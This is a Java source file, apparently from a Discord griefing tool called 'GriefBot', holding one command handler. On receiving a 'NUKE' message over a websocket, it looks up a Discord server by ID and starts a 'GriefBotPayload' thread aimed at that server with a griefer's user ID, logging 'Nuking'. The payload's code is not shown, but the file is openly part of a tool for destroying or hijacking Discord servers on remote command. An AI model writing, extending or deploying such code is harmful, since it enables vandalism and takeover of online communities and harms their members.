package de.corruptedbytes.webserver.packets.impl;

import org.java_websocket.WebSocket;

import de.corruptedbytes.GriefBot;
import de.corruptedbytes.GriefBotPayload;
import de.corruptedbytes.logger.GriefBotLogger;
import de.corruptedbytes.logger.GriefBotLoggerLevel;
import de.corruptedbytes.webserver.packets.Packet;
import net.dv8tion.jda.api.entities.Guild;

public class PacketNuke extends Packet {

	@Override
	public String getPacket() {
		return "NUKE";
	}

	@Override
	public void onPacketReceive(WebSocket webSocket, String message) throws Exception {
		try {
			Guild guild = GriefBot.getInstance().getBotManager().getGuildById(message);
			GriefBotPayload griefBotPayload = new GriefBotPayload(guild, GriefBot.getInstance().getBotManager().getUserById(GriefBot.getInstance().getGrieferUserID()));
			new Thread(griefBotPayload).start();
			
			GriefBotLogger.log("[" + getPacket() + "] Nuking: " + message, GriefBotLoggerLevel.INFO);
		} catch (Exception e) {
			GriefBotLogger.log("[" + getPacket() + "] Nuking failed! (" + e.getMessage() + ")", GriefBotLoggerLevel.ERROR);
		}
	}

}
